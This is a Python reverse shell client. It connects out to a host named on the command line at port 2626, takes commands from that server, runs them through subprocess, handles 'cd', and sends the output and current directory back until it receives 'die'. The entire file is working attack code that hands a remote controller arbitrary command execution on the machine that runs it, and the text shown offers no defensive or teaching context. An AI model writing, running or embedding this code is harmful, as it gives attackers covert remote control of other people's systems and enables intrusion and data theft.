import socket
import os
import subprocess
import sys

# Server to call to
server_host = sys.argv[1]

# Server port
server_port = 2626

# text buffer size (128KiB)
recv_buffer = 1024 * 128

# command seperator
seperator = "<sep>"

# Create and connect socket to server
soc = socket.socket()
soc.connect((server_host, server_port))

# Get current directory
cwd = os.getcwd()
print("cwd is "+cwd)
soc.send(cwd.encode())

# Main loop
while True:
    
    # Receive command from server
    command = soc.recv(recv_buffer).decode()
    split_command = command.split()
    
    # Breakout on keyword
    if command.lower() == "die":
        break
   
    # change dir command
    if split_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(split_command[1:]))
        
        except FileNotFoundError as e:
            output = str(e)
        
        else:
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)

    # get current dir
    cwd = os.getcwd()
    
    print("output: "+output)

    #send result to server
    message = f"{output}{seperator}{cwd}"
    soc.send(message.encode())

#close connection
soc.close()


